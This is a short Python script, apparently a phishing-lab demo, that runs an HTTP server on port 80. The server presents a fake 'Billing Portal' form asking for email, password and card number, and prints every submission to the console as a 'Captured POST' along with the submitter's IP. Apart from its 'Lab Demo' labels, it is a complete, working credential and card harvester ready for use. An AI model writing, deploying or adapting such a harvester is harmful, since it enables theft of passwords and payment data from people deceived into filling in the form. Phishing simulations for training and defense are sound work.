from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import unquote

HTML_PAGE = """<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>Billing Portal</title></head>
<body style="font-family:sans-serif;max-width:420px;margin:40px auto;">
  <h2>Account &amp; Billing Check (Lab Demo)</h2>
  <form method="POST" action="/submit">
    <label>Email/User:<br><input name="user" type="text" required></label><br><br>
    <label>Password:<br><input name="pass" type="password" required></label><br><br>
    <label>Card:<br><input name="card" type="text" required></label><br><br>
    <button type="submit">Submit</button>
  </form>
</body>
</html>"""

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(HTML_PAGE.encode())

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = unquote(self.rfile.read(length).decode(errors="ignore"))
        print(f"\n[!] Captured POST from {self.client_address[0]}: {body}\n", flush=True)
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(b"<h3>Submitted (Lab Simulation)</h3>")

    def log_message(self, format, *args):
        return

print("HTTP portal listening on port 80")
HTTPServer(("0.0.0.0", 80), Handler).serve_forever()
